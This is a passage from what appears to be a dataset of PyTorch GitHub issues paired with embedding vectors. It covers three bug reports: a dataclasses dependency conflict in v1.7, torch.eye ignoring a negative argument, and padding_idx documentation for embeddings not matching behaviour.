  1.72394618e-01 -5.71500883e-02  1.78456992e-01  1.29193127e-01
  1.06268272e-01 -9.31205079e-02 -6.20156787e-02  1.87266499e-01
 -1.89592138e-01 -5.07746935e-02 -2.48821914e-01  9.40698981e-02
  3.98776710e-01  1.82664454e-01  6.56107515e-02  3.19446623e-01
  3.23559344e-01  1.62742034e-01 -9.51692909e-02 -5.53135090e-02
  1.46337062e-01  1.19050056e-01  8.22279900e-02  1.36614954e-02
 -7.23988749e-03  1.15548015e-01  4.16484416e-01  1.45480216e-01
 -2.27081537e-01 -1.79855525e-01 -9.23792273e-02  8.60429704e-02
 -1.43296376e-01 -2.35139802e-01 -7.21504167e-03 -3.76725912e-01
 -1.08534783e-01  1.90264300e-01 -1.85432330e-01  2.94313997e-01
  1.87507495e-01 -2.08389565e-01 -1.11638829e-01  1.15130678e-01
 -4.47865337e-01  4.32755589e-01  1.31993387e-02  2.22256422e-01
  2.38244176e-01 -2.69614346e-02  3.68133724e-01 -1.82735711e-01
 -5.51933236e-03  2.07283184e-01  1.25679910e-01 -2.58818716e-01
 -2.85227925e-01  1.27768517e-01 -1.96644396e-01 -1.96415618e-01
 -3.26361954e-01 -2.28853613e-01 -3.20462197e-01 -6.57338053e-02
 -2.94425758e-04 -2.40962625e-01 -4.24517877e-02  9.78188664e-02
 -1.52828693e-01 -4.13427472e-01  1.68110356e-02  1.87887549e-01
  9.92807150e-02  4.60178554e-01  2.20785737e-02  1.19617805e-02
 -8.24458823e-02 -6.85062259e-02  2.57375240e-01 -2.31351346e-01
 -1.49190754e-01 -1.25741325e-02 -7.63052776e-02 -5.63617349e-02
  3.24701786e-01 -1.22061953e-01 -5.62603101e-02 -1.03868768e-01
 -4.85702083e-02 -8.74937326e-02  1.28465042e-01  9.60665010e-03
 -1.56588197e-01  1.80930763e-01 -1.76076237e-02 -4.54066545e-02
  1.05599187e-01  1.05146907e-01 -3.24724287e-01 -2.72754848e-01
 -2.82410830e-01 -2.58083045e-02 -2.46258900e-01 -2.65140086e-03
  1.87434144e-02 -1.95624635e-01 -2.31154755e-01  1.25067919e-01
  3.04305702e-02  4.76976391e-03  3.83442074e-01  3.85228172e-03
  3.93652655e-02 -1.32722795e-01 -1.65043026e-01 -2.16017261e-01
  2.22486883e-01  3.07934862e-02 -6.54991418e-02  5.44055402e-02
  1.65591151e-01  3.02165598e-02 -2.01085180e-01 -3.60761672e-01
  2.26271391e-01 -3.99751887e-02 -7.70941824e-02  2.80110449e-01
 -4.32702973e-02  7.35158548e-02 -9.28458273e-02  4.39757526e-01
 -9.50287580e-02  1.24990068e-01  5.24492636e-02 -1.83289692e-01
 -1.11106880e-01 -3.20316017e-01 -4.27663684e-01  4.24788371e-02
 -3.67434502e-01  3.89285088e-02  1.69214845e-01 -1.61542222e-01
  1.51728243e-01  9.96753871e-02  1.90973058e-01  1.64488941e-01
 -9.61992368e-02 -1.30359828e-01 -8.53319317e-02 -2.55148947e-01
  1.03550613e-01  2.09272444e-01 -1.12419605e-01  3.49824488e-01
  2.45966181e-01 -1.09717384e-01 -1.56105936e-01  3.12679529e-01
 -2.19823301e-01 -1.37836993e-01  1.98958263e-01 -5.99982262e-01
  4.41165447e-01  1.89849794e-01  3.14505160e-01 -1.43859625e-01
  6.45676970e-01  3.68500203e-02  2.80726831e-02  4.51474898e-02
  2.30205748e-02  3.12615991e-01  1.47518098e-01  2.13113040e-01
  4.50323969e-01 -7.97324553e-02 -1.54976085e-01 -5.38800545e-02
 -5.46764612e-01 -2.14276135e-01 -1.51487470e-01  2.84054399e-01
  4.19927448e-01 -1.03990838e-01 -2.28356883e-01 -1.12600714e-01
  4.03676480e-01 -1.70557261e-01  1.79095715e-01 -1.01198591e-02
 -2.74786472e-01  1.64621755e-01  1.46102786e-01 -5.52809890e-03
  1.17313899e-02  1.47544682e-01  2.02731434e-02  6.20788801e-03
  2.95195639e-01 -4.60990369e-01  6.58529997e-01  3.53587955e-01
  1.90776903e-02  3.50125164e-01 -2.81405240e-01  1.48074821e-01
 -8.17437768e-02  2.09703505e-01  1.93479270e-01  3.03546786e-02
 -7.77713433e-02 -1.09432213e-01 -7.91116953e-02 -7.42936283e-02
 -3.13622057e-02  2.61639595e-01 -1.41700760e-01 -1.15309119e-01
 -2.37496212e-01 -2.19427496e-02  1.13772437e-01 -2.96150725e-02
  5.88729605e-03 -2.06096768e-02  8.70095789e-02 -9.19204727e-02
 -1.50999650e-01  6.75748140e-02  4.76979837e-02 -1.51815340e-01
 -1.00547550e-02 -6.18452430e-02  2.25477368e-01 -1.18235275e-01
 -9.55115259e-02 -2.67115235e-02  1.41681880e-01  1.06438119e-02
 -5.47961891e-02  7.25546703e-02  1.01255000e-01  4.12570611e-02
 -2.53306746e-01 -3.72718927e-03  1.07589386e-01  5.16136825e-01
 -1.33177921e-01  1.80631161e-01 -6.91488804e-03  1.04992166e-01
 -4.42690611e-01  4.49829280e-01 -2.74605095e-01 -1.89336434e-01
  3.95268872e-02 -1.72636181e-01 -3.15908849e-01 -3.52952719e-01
  9.88871083e-02  1.99489862e-01 -2.17317790e-01  5.90986609e-02
 -1.18556291e-01  3.34176958e-01  2.81732142e-01  2.20488861e-01
  1.81059748e-01  2.40735970e-02  1.92712188e-01 -2.73137689e-01
  2.46368293e-02  2.44601622e-01 -6.89055026e-02 -2.08958909e-02]"
"v1.7 requirement ""dataclasses"" is not compatible with python > 3.6 module: build oncall: releng triaged","## ðŸ› Bug

v1.7 for Python 3.7 and 3.8 has requirement for `dataclasses` but it is not compatible with 3.7 and 3.8.
```
ERROR: Package 'dataclasses' requires a different Python: 3.7.7 not in '>=3.6, <3.7'
```
This result in not install torch.

Note :  `dataclasses` is part of Python 3.7 : https://docs.python.org/3.7/library/dataclasses.html

## To Reproduce
Install pytorch in a virtual env. freshly created. With python 3.7
```
(env) $ pip install ./torch-1.7.0-cp37-cp37m-linux_x86_64.whl
```

## Expected behavior

Install correctly without package dependency failing.

## Environment

 - PyTorch Version (e.g., 1.0): v1.7
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source):
 - Python version: 3.7 and 3.8
 - CUDA/cuDNN version: 11
 - GPU models and configuration: - 
 - Any other relevant information: -


Please add a marker to requirement for python 3.6 only.
https://github.com/pytorch/pytorch/blob/bbe5bfaa4f5ec1d80cd971198e4abcfd2ea96a7a/requirements.txt#L8
should be:
```
dataclasses; python_version<""3.7""
```

cc @malfet @seemethere @walterddr",True,"[-2.21764326e-01 -2.82399118e-01 -3.61951262e-01  1.51971459e-01
  3.28563713e-02 -1.29766911e-01 -2.95320898e-01  4.75180410e-02
 -6.81633353e-01 -1.96127594e-02 -7.04770386e-02 -2.33422369e-01
 -4.26024199e-01  3.03868532e-01  1.49650127e-01  1.51507556e-01
  8.27129781e-02 -3.08979511e-01 -8.43876898e-02  8.71185120e-03
 -3.83333415e-02 -6.81635663e-02 -1.31025210e-01 -1.14980757e-01
  1.47298843e-01 -7.65782595e-02 -4.38574255e-01 -1.21721394e-01
  1.32187411e-01  3.12905133e-01 -1.17818005e-02  8.86010751e-02
 -3.38672757e-01  1.19618922e-01  3.04250896e-01  8.94984603e-02
 -3.60138416e-02 -1.69265136e-01 -1.27503112e-01 -2.03510262e-02
 -2.26251319e-01  3.63451466e-02 -1.69760838e-01  8.00620615e-02
 -1.78752780e-01 -3.33667457e-01  4.54412699e-02  1.14020817e-01
 -3.05909097e-01 -8.85374546e-02 -1.56600311e-01 -1.16998054e-01
 -6.41384348e-02 -2.21508011e-01  1.21150166e-01  4.66879904e-02
  1.75557677e-02  3.74114990e-01  1.62081242e-01 -1.40588582e-01
  2.68055797e-01 -2.37682387e-01  1.37393445e-01  1.07896402e-02
 -1.36373475e-01  1.49264157e-01 -1.44944280e-01 -8.35942626e-02
  6.62515938e-01 -1.94519401e-01 -4.32625450e-02 -9.36814696e-02
 -4.52429652e-01 -3.22686248e-02 -2.48439275e-02 -7.19412416e-02
 -1.08966634e-01  3.25866431e-01  6.69744192e-03 -3.94628465e-01
 -1.44996613e-01 -6.51426688e-02 -1.10379837e-01  8.69962871e-02
  7.23534748e-02 -1.36183023e-01  8.41513351e-02 -1.90126091e-01
  1.90336302e-01  3.66009265e-01  3.76112819e-01 -1.69228524e-01
  2.45452002e-02  4.37522560e-01 -3.33817840e-01 -1.91737041e-02
  9.18850750e-02  5.89933991e-02 -2.88321018e-01 -1.71461344e-01
 -7.08703101e-02 -6.51261389e-01 -6.40033856e-02  5.98874629e-01
  1.31664976e-01 -1.18871547e-01  2.16780335e-01 -2.31837248e-03
  9.48193893e-02 -1.45619601e-01  2.94213176e-01  7.29926378e-02
  6.46839738e-02 -3.40462238e-01 -5.12307771e-02  5.15492037e-02
 -5.42500377e-01  1.09350011e-01  2.09461991e-03  3.90644610e-01
  1.40466854e-01  1.02192946e-01  4.32083815e-01 -5.63868731e-02
  4.34591204e-01 -1.01271614e-01 -1.61119118e-01 -3.56957726e-02
 -9.90696847e-02 -5.60651571e-02  3.40440869e-01  1.58947885e-01
 -1.55846581e-01  5.00976816e-02  5.50573707e-01  3.56094390e-01
 -4.24896479e-01 -4.74134743e-01 -5.17625622e-02 -1.46996379e-01
 -7.07154870e-02  9.01551470e-02  1.35615051e-01 -2.85978407e-01
  1.76900327e-02  1.65739864e-01  4.83266860e-02  2.91775644e-01
 -1.50193200e-01 -1.07728615e-01  3.25301811e-02  6.91316724e-02
 -3.01552713e-01  3.14022332e-01  2.06228673e-01  3.28367591e-01
  4.94648278e-01 -4.06471500e-03  1.48766518e-01 -3.74146491e-01
 -1.29748918e-02  4.92512703e-01 -1.72073454e-01  7.33100623e-02
 -4.38326932e-02 -3.48436385e-02 -2.01243535e-01 -1.49565592e-01
 -2.67920494e-01  1.29806679e-02  1.89807758e-01 -2.10866835e-02
  1.57453120e-01 -1.88630611e-01  4.04979199e-01 -1.19994402e-01
  8.90342295e-02 -5.41154921e-01  2.28384241e-01  3.06339145e-01
  5.21977961e-01  3.67705554e-01  1.98549718e-01 -1.52837589e-01
  1.73352763e-01  2.49327570e-01  2.49706164e-01 -1.38841510e-01
  1.58114493e-01 -5.22708371e-02 -1.08698033e-01 -8.68740976e-02
  7.29711130e-02 -9.14241001e-03 -1.21473998e-01 -3.66818979e-02
  2.41833210e-01 -1.18391521e-01  8.16305280e-02 -2.79472210e-02
 -1.76897556e-01  4.39945757e-01  3.00351948e-01  3.16541903e-02
  8.96953046e-02 -1.48736387e-01 -2.58987010e-01 -1.31018490e-01
 -2.45046616e-01 -1.63881212e-01 -1.26808882e-05 -5.91076352e-02
 -3.05875003e-01 -4.56620753e-01 -3.01614404e-02  2.05384284e-01
  3.89256597e-01  8.37318823e-02 -7.13055283e-02  2.34395768e-02
 -9.92369354e-02 -7.12692440e-02  1.90211713e-01 -2.26110190e-01
  2.70428061e-01  1.38617843e-01 -1.00091681e-01 -1.66513592e-01
 -1.95034891e-01  9.65001285e-02 -1.05186984e-01 -4.62951988e-01
  1.68567836e-01 -1.24222562e-01  5.51953427e-02  1.40876234e-01
  1.74255341e-01 -1.46027356e-01 -3.25835794e-02  2.21403360e-01
 -3.72339934e-01 -1.08312041e-01 -3.22533995e-02 -1.64195687e-01
  7.98757970e-02 -1.23848714e-01 -3.75498414e-01 -6.16198331e-02
 -2.06851795e-01  4.86417226e-02 -3.37155640e-01 -1.43713161e-01
  1.75035954e-01  4.92000803e-02  4.90090668e-01 -4.52587195e-03
  1.55795664e-02 -2.41597027e-01 -8.87824371e-02 -1.25575334e-01
  6.15833774e-02  3.71371619e-02 -5.77632971e-02  3.76356095e-01
  1.92040011e-01  3.30347121e-02 -7.79394656e-02  4.07349169e-01
 -1.22915998e-01 -2.66233265e-01  2.60677516e-01 -2.92700768e-01
  2.08335757e-01 -7.60584399e-02 -6.55188113e-02  9.62405205e-02
  3.08703125e-01 -1.59596801e-01 -4.69995439e-02 -2.60197401e-01
  2.22679749e-01  4.28159356e-01 -9.65974852e-02  7.04762712e-02
  3.19279253e-01 -2.32666388e-01 -5.73548861e-03 -1.47201985e-01
 -1.48382902e-01  1.84759218e-02  2.21786741e-02  5.30462712e-02
  3.22607040e-01  2.80023217e-02 -1.24892205e-01 -1.86744779e-01
  3.88708413e-02 -2.38079980e-01  3.86621058e-01  3.44412744e-01
 -1.59562856e-01  2.59028256e-01 -1.22277930e-01 -7.67380297e-02
  2.15959340e-01 -3.71747673e-01  9.13223177e-02 -2.61034612e-02
  3.21656168e-01 -4.92087305e-01  4.00738031e-01  9.67216939e-02
 -2.67642826e-01  4.59223241e-01  7.10126683e-02 -1.86111461e-02
 -3.00570875e-01  3.93568099e-01  3.11427921e-01  9.84421447e-02
  2.41109319e-02 -2.72295065e-02 -3.01915228e-01 -3.15612435e-01
  4.61648814e-02  1.03294007e-01 -3.37871134e-01  2.58862793e-01
 -6.82353899e-02  1.32941708e-01 -1.07725829e-01  1.19833797e-01
  1.33246273e-01 -2.46741474e-02 -7.66586661e-02 -2.26359889e-01
 -2.18729734e-01  3.22390676e-01  1.27354097e-02  1.83486357e-01
  4.11604345e-02 -1.13312371e-01 -2.09312916e-01 -1.05045885e-01
 -2.89645970e-01  4.52892818e-02  3.37063909e-01  6.40268207e-01
 -6.38384372e-02 -1.72854871e-01  2.77610600e-01  9.31133926e-02
 -1.15428858e-01  7.07335174e-02  1.54379040e-01  2.53362060e-01
 -1.34851158e-01  1.50402427e-01  2.57979542e-01  1.36023670e-01
 -1.45558745e-01  1.03936471e-01 -3.17762375e-01 -1.43961564e-01
  1.25258669e-01 -1.06691912e-01 -3.55786771e-01 -3.82625945e-02
 -7.40183331e-03  4.52640414e-01 -3.21065038e-01  2.01764867e-01
 -2.37106904e-01 -1.04884952e-02  3.07134688e-01  6.73626140e-02
  3.17869824e-03  1.48125693e-01 -3.45697664e-02 -1.54328257e-01
  1.10087991e-01 -1.41437575e-01  2.60819286e-01 -1.03553124e-01]"
negative second argument in `torch.eye` is ignored module: docs triaged module: tensor creation,"If second argument to `torch.eye` is negative, it is treated as missing argument (e.g. `torch.eye(5,-1)` is the same as `torch.eye(5)`. 
We should either error out, or document this behavior. 
Numpy errors out for negative second argument. 


cc @jlin27 @mruberry @vishwakftw @jianyuh @nikitaved @pearu @heitorschueroff",True,"[-2.13995114e-01  6.51160181e-02 -5.24612814e-02  1.70133844e-01
  5.89375496e-02 -1.41917631e-01  2.07554638e-01  2.25247759e-02
 -1.16517335e-01 -1.35820672e-01 -1.17003899e-02  1.26657095e-02
 -2.92809725e-01  3.70753974e-01 -8.22102092e-03  3.57644036e-02
 -3.41076165e-01 -1.83259770e-01  1.54588069e-03 -3.39838788e-02
  4.71502841e-02 -1.41715631e-01 -1.93793803e-01 -1.71353161e-01
  2.47605015e-02  7.49863014e-02 -1.79943115e-01 -2.99369186e-01
  4.76979017e-01  2.55530089e-01  2.29167342e-01 -4.73136269e-02
 -4.32365805e-01 -9.11674425e-02  1.08096249e-01 -8.94856229e-02
 -5.11910498e-01 -1.05456583e-01 -1.53180480e-01 -8.87578912e-03
 -6.30241409e-02  1.15317531e-01 -1.99550971e-01 -9.41471830e-02
  6.00688672e-03  1.99645326e-01 -6.40772060e-02 -1.00539159e-02
 -1.62472799e-01  5.23015633e-02 -3.46695334e-01  6.24979883e-02
 -2.72111475e-01 -1.10725172e-01  3.22662741e-01 -1.34127021e-01
 -2.42120415e-01  7.91826621e-02  4.13265117e-02 -4.78382587e-01
  8.48613456e-02 -5.79130612e-02 -1.88898474e-01 -1.18251488e-01
  2.38495752e-01 -1.65187456e-02 -6.00978993e-02 -1.41819686e-01
  3.53217781e-01  7.60493129e-02  1.92628279e-01  1.67178646e-01
  2.99434721e-01 -2.73044974e-01 -2.02395543e-01  1.77702412e-01
 -3.03278491e-02  2.46530160e-01 -8.72076862e-03 -2.73162842e-01
  1.38657421e-01  1.19239777e-01 -6.05479181e-02  2.31513917e-01
  1.43642515e-01 -4.86766919e-02  7.10932910e-02 -4.92002908e-03
  2.62164325e-01  8.84872004e-02  2.45872959e-02 -1.63614154e-02
  4.88239937e-02  2.86413997e-01  3.90124097e-02  1.54387385e-01
  2.22812295e-01 -3.87931266e-03 -3.47103089e-01  3.11222821e-02
 -4.41189893e-02 -3.58255923e-01 -3.67064297e-01  3.04258972e-01
  1.83819965e-01  7.25360215e-02  1.94198087e-01  1.15187438e-04
 -1.50833642e-02 -6.21751100e-02  3.80306631e-01 -1.53306633e-01
  8.89202487e-03 -1.17936851e-02 -1.94045559e-01 -3.94445960e-04
  2.26396456e-01 -1.38743073e-01 -3.31427008e-02  1.09718107e-01
 -2.04893816e-02  3.63092184e-01  1.45080566e-01  1.32133707e-01
  3.21772963e-01  6.69567063e-02 -7.00984150e-02 -1.45593956e-01
 -6.96310028e-02  6.02755249e-02  8.04834962e-02 -3.95785384e-02
 -1.28487259e-01  6.89851567e-02  2.73154706e-01  4.69467789e-01
 -3.43944430e-01 -1.33531570e-01 -8.09684321e-02 -1.62258983e-01
  1.59930751e-01  8.81229937e-02 -2.51580954e-01  1.36646349e-02
  3.33300918e-01  1.22321174e-01 -2.78232515e-01  2.67299637e-02
  1.55156136e-01  2.53985643e-01 -1.57514542e-01 -1.95530392e-02
 -4.23143536e-01  4.16937292e-01 -5.88881373e-02 -1.09647743e-01
  2.27094561e-01  1.14903152e-01  1.00542903e-01 -2.53702134e-01
  2.59655207e-01  2.83369213e-01 -8.83496851e-02  5.45395399e-03
  1.30697966e-01  1.99737966e-01 -3.32723469e-01 -1.35975420e-01
 -4.40409124e-01  3.78820628e-01  8.84983689e-02 -2.92080909e-01
 -7.75745586e-02  8.17656070e-02  4.22144122e-02 -4.28579599e-02
 -1.58482373e-01 -3.31939429e-01 -1.11027751e-02  2.95833081e-01
  2.70127892e-01  4.38309759e-01  4.48171824e-01  7.17823654e-02
 -2.17449725e-01  3.07422876e-01  3.54889572e-01  3.88435349e-02
 -8.69290158e-03  4.25492972e-03 -3.26418936e-01 -3.77077341e-01
 -6.51431680e-02  1.66536957e-01 -1.74241140e-01  3.92912805e-01
  1.02877421e-02 -4.67689931e-01 -2.43950665e-01  5.93927049e-04
  2.08831299e-02  5.22035314e-03  1.37795717e-01 -2.69819885e-01
  2.05066532e-01 -1.08485065e-01 -1.00372352e-01 -5.32476783e-01
 -3.23829710e-01  2.30425119e-01 -3.86763737e-02 -4.77644444e-01
 -3.85218322e-01 -2.49881327e-01  1.22599406e-02  9.29607451e-02
 -3.05563003e-01 -6.93534389e-02 -1.34767011e-01  3.90499860e-01
  1.84705444e-02  1.08533375e-01 -8.56741965e-02 -2.91222215e-01
 -1.83411837e-01 -9.13725197e-02 -3.64843309e-01 -3.59854519e-01
 -3.08746815e-01  1.45052165e-01  1.15054511e-01 -3.67655575e-01
  3.45153183e-01 -8.04672539e-02  1.26877099e-01  3.66065264e-01
 -2.75107205e-01  4.91740298e-04 -1.35132298e-01 -2.70540733e-02
 -1.45367980e-01 -1.65973380e-01  8.32417607e-02  4.66177911e-02
 -2.24500090e-01  2.18407631e-01 -2.26309225e-01  2.21444350e-02
 -1.96483001e-01  3.39900970e-01  4.50542837e-01 -3.19833338e-01
 -1.42091960e-01 -8.31089765e-02  3.68427843e-01 -2.70430092e-03
 -9.17554423e-02 -5.73021211e-02 -2.97779404e-02  5.54918237e-02
 -3.75402980e-02 -2.99021006e-02 -9.60047171e-02  2.32593074e-01
  7.66625926e-02  2.21076310e-01  1.57905862e-01  4.57757920e-01
 -1.81487352e-01 -2.19122306e-01 -2.96291471e-01 -1.43694341e-01
  1.81440473e-01 -1.95988238e-01 -2.15020448e-01 -4.03010935e-01
  1.81534722e-01 -3.66364233e-02 -3.88946474e-01 -3.55482548e-01
  3.28581631e-01  2.27240786e-01 -3.43723558e-02  3.12730014e-01
  5.53704083e-01 -3.56553018e-01 -1.04587391e-01 -1.64867178e-01
  9.03672874e-02 -8.86492804e-02 -3.99564892e-01  2.10674211e-01
  7.71227002e-01 -1.08247399e-01 -2.81899631e-01 -1.10566109e-01
 -2.77943928e-02 -5.52833751e-02  2.09705681e-01  3.66070926e-01
 -4.38513272e-02  1.39213651e-01  7.82753155e-02 -7.01652691e-02
 -4.46389924e-04 -2.11134210e-01  1.61417827e-01  2.54548430e-01
  2.19011605e-01 -2.57436603e-01  2.52654344e-01 -1.15361638e-01
 -1.27158970e-01  3.73025894e-01 -1.97686434e-01  1.71034008e-01
 -5.49583398e-02  3.27619016e-01  2.33932629e-01  2.26453513e-01
 -1.94257438e-01 -2.98636615e-01 -7.98645020e-02 -9.82323438e-02
 -9.91339609e-02 -1.85763538e-01 -2.72541791e-01  2.00618654e-01
 -3.08451623e-01 -1.03962377e-01  4.01497586e-03 -1.31499365e-01
  1.28935993e-01  2.47728318e-01 -4.69917664e-03 -2.75977496e-02
 -3.74007262e-02  8.64992440e-02  3.40957269e-02 -3.71749774e-02
 -2.39279419e-01 -2.49058589e-01 -1.37105256e-01 -5.73275946e-02
 -1.51088029e-01 -2.17020120e-02  4.53074843e-01  2.11230549e-03
 -2.13324398e-01  5.04098199e-02  8.42902530e-03  3.12736392e-01
  1.97057068e-01  4.53160703e-01  2.10908204e-02  3.30446452e-01
 -3.22963670e-02  1.85023114e-01  1.40567079e-01  2.45376810e-01
 -1.41665027e-01 -5.54752164e-03 -1.03394367e-01 -3.25648516e-01
  9.80246142e-02  3.64307761e-02  3.38242710e-01 -8.18365440e-02
  2.22391173e-01  3.06705564e-01 -1.01521850e-01  2.06165254e-01
 -1.19780591e-02  2.40596086e-01  5.42274892e-01 -2.95185506e-01
  3.11665803e-01 -8.29609632e-02 -1.63743630e-01 -2.07205191e-01
  1.68129161e-01  1.42923921e-01 -7.65347704e-02  1.28565654e-01]"
padding_idx and provided weights in nn.Embedding and nn.functional.embedding  high priority module: docs module: nn triaged module: embedding,"**1)** nn.Embedding documentation says:

> padding_idx (int, optional): If given, pads the output with the embedding vector at :attr:`padding_idx`
>                                          **(initialized to zeros)** whenever it encounters the index.

But, In case of using the `from_pretrained` version, if input is equal to padding_idx, weigths[padding_idx] gets returned and not a vector of zeros.

Code example for reproducing:
```python
predefined_weights = torch.rand(10, 3)
emb = torch.nn.Embedding.from_pretrained(embeddings=predefined_weights, padding_idx=0)
result = emb(torch.LongTensor([1,2,0]))
```
The 3rd vector in the result is not a zero vector.

This might be a documentation issue, and the doc should say that in case of using `from_pretrained`, padding_idx will not return a zero vector, but instead, weigths[padding_idx]
**But**, it makes the use of `padding_idx` in `from_pretrained` redundant, thus I would suggest removing `padding_idx` from the arguments if this is indeed the case.

I can open a PR for this but need some feedback regarding the approach to take here, please advise.

**2)** nn.**functional**.embedding documentation says:
 

> padding_idx (int, optional): If given, pads the output with the embedding vector at :attr:`padding_idx`
>                                          (**initialized to zeros**) whenever it encounters the index.

But, the result for `index = padding_idx`  returns weigths[padding_idx] and not a zero vector.

Code example for reproducing:
```python
predefined_weights = torch.rand(10, 3)
result = torch.nn.functional.embedding(torch.LongTensor([1,2,0]), predefined_weights, padding_idx=0)
```
The 3rd vector in the result is not a zero vector.

IMO this is a documentation issue, and the doc should say that padding_idx pads the output with the embedding vector at padding_idx. (and not a zero vector)

cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @jlin27 @mruberry @albanD",True,"[-1.04069665e-01 -9.71339270e-02 -2.52338409e-01 -1.57611251e-01
 -1.25613153e-01 -8.07854682e-02  9.96530987e-03 -7.47684985e-02
 -2.47665122e-01 -9.63135734e-02  1.30566610e-02  1.73743337e-01
  3.80290568e-01  1.81164235e-01 -3.78948212e-01  1.59851715e-01
 -2.28359088e-01  1.53520867e-01  1.98389858e-01  7.52336681e-02
  9.55547839e-02  1.19543225e-01 -2.06369422e-02 -9.89359990e-03
  3.46426189e-01 -9.81409252e-02 -5.26118614e-02 -3.06680761e-02
  3.02365720e-01 -3.44678491e-01  2.47266144e-01  7.41562471e-02
 -1.96235597e-01  5.96882105e-02  8.84906501e-02  1.53180301e-01
 -4.12323028e-02 -1.16633568e-02 -3.27775300e-01  2.38169000e-01
  4.53132913e-02  4.18993570e-02  1.18652709e-01 -1.25717044e-01
  3.59970748e-01 -2.40565941e-01 -2.87928343e-01 -2.00168610e-01
 -1.15607768e-01  2.60397494e-01 -2.30548717e-02  1.49414390e-01
 -1.17710777e-01 -2.40142271e-01  6.51986152e-02  1.25856800e-02
  3.83971483e-02 -2.35260308e-01 -7.85705447e-02 -6.81629777e-03
 -1.11759566e-02 -1.64435841e-02  1.51435703e-01  3.87353539e-01
 -5.95785715e-02  1.90115198e-01  2.99352687e-02  5.90737239e-02
 -2.18881607e-01  2.25428715e-01  6.89806268e-02 -2.59113070e-02
 -1.83358580e-01 -2.37936988e-01  1.20698288e-01  2.05069393e-01
 -1.65767819e-01  2.14303255e-01 -1.83768617e-03 -3.85386616e-01
 -2.73999125e-02  4.06560957e-01  1.57182328e-02  3.90787087e-02
 -1.87367722e-02  2.66867243e-02  3.51107597e-01 -2.64858544e-01
  7.92562068e-02  9.40932184e-02  2.61835694e-01 -1.65312029e-02
 -3.37022811e-01  2.28493586e-01  3.68182808e-01 -9.14209336e-03
 -3.45934816e-02  1.02634512e-01 -2.18377233e-01 -2.20148429e-01
 -1.83080524e-01  1.98827565e-01 -2.38431185e-01  4.24057357e-02
  9.62318480e-02 -3.19655500e-02 -5.98529764e-02 -3.79024208e-01
 -4.92563993e-02 -1.09607354e-01  3.53542805e-01  1.32061318e-02
 -4.71733660e-02 -8.50137174e-02 -1.46617919e-01 -5.42776771e-02
  3.70879769e-01 -1.38959035e-01  1.41987637e-01  2.80044377e-01
 -7.32548833e-02 -3.56435105e-02 -3.83844852e-01  3.37676287e-01
  2.50960171e-01 -1.68518350e-02  1.22606922e-02 -8.78676698e-02
 -2.76343346e-01 -4.60916966e-01  3.71037364e-01  3.12217586e-02
  1.88983306e-01  4.72820364e-04  1.68733731e-01 -5.08691557e-02
 -5.00690222e-01 -2.67759740e-01 -5.10246754e-01  1.43731795e-02
 -1.26222819e-01  4.77135554e-03 -9.07663181e-02 -4.54352051e-03
  5.90856262e-02  2.83124745e-01 -1.54948741e-01 -1.04397811e-01
 -1.57791436e-01 -4.81313691e-02 -1.47357017e-01 -8.75490010e-02
 -2.86133766e-01  2.68321097e-01 -2.06246041e-03  9.98108238e-02
  6.92214444e-02 -1.05911434e-01 -3.11176360e-01 -2.91349888e-01
  8.93639028e-02  1.50178000e-01 -5.43956459e-02  7.84554332e-02
  2.25749284e-01  2.66880184e-01 -2.03004897e-01  9.81148407e-02
 -2.91946322e-01  4.80933599e-02 -2.91976165e-02  1.49967104e-01
 -2.43483737e-01  1.21627763e-01  4.38860804e-01 -1.32449955e-01
 -2.53135949e-01 -4.35734123e-01 -3.72385047e-03  1.90099061e-01
  2.71562517e-01  8.96632746e-02  7.62454886e-03 -1.27641648e-01
 -4.09358710e-01  3.77317294e-02 -9.61173996e-02 -6.19609766e-02
 -1.74277708e-01  1.74019352e-01  9.48490500e-02 -2.15788916e-01
 -1.60957426e-02  1.11607417e-01  9.84845310e-02 -1.54089659e-01
  2.05068499e-01  1.92369148e-01  2.77577415e-02  8.44875127e-02
 -2.66520798e-01 -2.97201514e-01  4.37285244e-01  1.30076438e-01
 -4.10684571e-03 -1.51354313e-01 -1.63066193e-01 -1.90506712e-01
 -2.17593938e-01  3.79808545e-01 -2.46928930e-01 -3.45648080e-02
  3.06751132e-01 -2.83830404e-01 -1.03752486e-01  5.17651260e-01
  1.69307604e-01  2.11025447e-01  6.07734323e-02 -8.08053464e-02
 -2.90609654e-02 -6.47630095e-02  1.17650256e-02 -2.21817225e-01
  1.14030153e-01  1.20241992e-01 -1.87085152e-01  1.49289280e-01
 -2.43899256e-01  1.13307267e-01  8.57545808e-02 -1.93941712e-01
  3.56383547e-02 -3.17546040e-01 -5.65841794e-02  2.34842643e-01
  7.74949342e-02  4.94300053e-02 -2.80059334e-02  1.37196958e-01
 -5.21902978e-01  7.72406906e-03 -1.66345686e-01 -5.93523979e-02
  3.45118552e-01 -3.87889296e-02  2.30417654e-01  3.10934842e-01
 -1.37595251e-01  3.57651174e-01 -2.44540066e-01 -2.81725684e-03
  2.37546772e-01 -2.04941556e-01  8.28272998e-02 -6.97709918e-02
  1.20682664e-01 -3.43797822e-03 -1.82825774e-01 -6.38303459e-02
  3.50307137e-01  1.94681615e-01 -3.37077826e-02  6.94638729e-01
  7.73509145e-02 -1.60105467e-01 -3.75011712e-01  3.35752144e-02
  1.50161106e-02 -3.93653512e-01  1.17036514e-04 -4.24412377e-02
  5.04049301e-01  2.76342481e-02 -1.25886872e-01 -9.99415293e-02
  2.04699069e-01 -1.54470727e-02 -8.22588876e-02 -1.53397024e-01
 -4.15300041e-01  1.12669162e-01  5.25507927e-02  5.51994920e-01
  1.22956503e-02 -2.28876263e-01 -4.26449813e-02 -1.99659377e-01
 -2.94531882e-01  1.18160248e-02 -1.61140725e-01 -1.01958409e-01
 -1.20688364e-01  1.42929316e-01 -1.21945381e-01  2.75122821e-01
  2.18388617e-01  2.73316167e-03 -8.70463159e-03 -1.43936761e-02
  2.38943785e-01  9.34482887e-02  9.35796723e-02  8.42903405e-02
 -8.59313309e-02 -9.70468670e-02  2.22668439e-01  2.95541048e-01
  9.88097787e-02 -3.24830748e-02  4.98951644e-01  5.69119155e-02
 -2.61486381e-01  1.83353573e-01  9.71247070e-03  2.34834045e-01
 -8.52392092e-02  4.65641916e-01 -2.35153466e-01  7.40638301e-02
 -5.36509156e-01 -2.43523657e-01 -2.53049463e-01  2.01045066e-01
 -1.13843113e-01  2.93774992e-01 -2.93226801e-02  3.44091170e-02
 -1.41083211e-01 -8.28633364e-03  6.01373196e-01 -1.72132745e-01
